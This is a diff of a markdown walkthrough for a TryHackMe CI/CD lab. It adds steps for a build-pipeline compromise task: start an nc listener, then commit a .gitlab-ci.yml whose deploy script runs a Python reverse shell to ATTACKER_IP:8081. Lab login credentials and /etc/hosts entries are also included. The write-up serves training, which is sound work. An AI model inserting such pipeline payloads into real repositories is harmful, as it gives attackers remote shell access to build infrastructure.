@@ -223,15 +223,15 @@ nc -lvp 8081
 * Go to http://gitlab.tryhackme.loc/ash/approval-test
 * Edit `.gitlab-ci.yml` (replacing `ATTACKER_IP`):
 ```yaml
-   stages:
-     - deploy
+stages:
+  - deploy
 
-   production:
-     stage: deploy
-     script:
-       - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ATTACKER_IP,8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
-     environment:
-       name: ${CI_JOB_NAME}
+production:
+  stage: deploy
+  script:
+    - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ATTACKER_IP,8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+  environment:
+    name: ${CI_JOB_NAME}
 ```
 * Commit changes and create merge request
 
@@ -302,3 +302,38 @@ Congratulations! You have received the flag for: Build Pipeline Compromise
 
 Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
 ```
+
+## Task 9: Securing the Build Pipeline
+
+**Prepare attacker machine**
+
+⚠️ AttackBox is suposed to be visible from **Gitlab runners** but sometimes it is not, so the alternative is to do it locally connected to the CI/CD VPN (see Task 2: Setting up)
+
+* Execute the listener:
+```shell
+nc -lvp 8081
+```
+
+**Run Gitlab job to get a reverse shell**
+
+* Go to http://gitlab.tryhackme.loc
+* Log in as `anatacker` (password `Password1@`)
+* Go to http://gitlab.tryhackme.loc/ash/environments
+* Edit `.gitlab-ci.yml` (replacing `ATTACKER_IP`):
+```yaml
+stages:
+  - deploy
+
+production:
+  stage: deploy
+  script:
+    - /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ATTACKER_IP,8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+  environment:
+    name: ${CI_JOB_NAME}
+```
+* Commit changes and create merge request
+
+
+
+sudo echo 10.200.6.150 gitlab.tryhackme.loc >> /etc/hosts
+sudo echo x.x.x.x jenkins.tryhackme.loc >> /etc/hosts
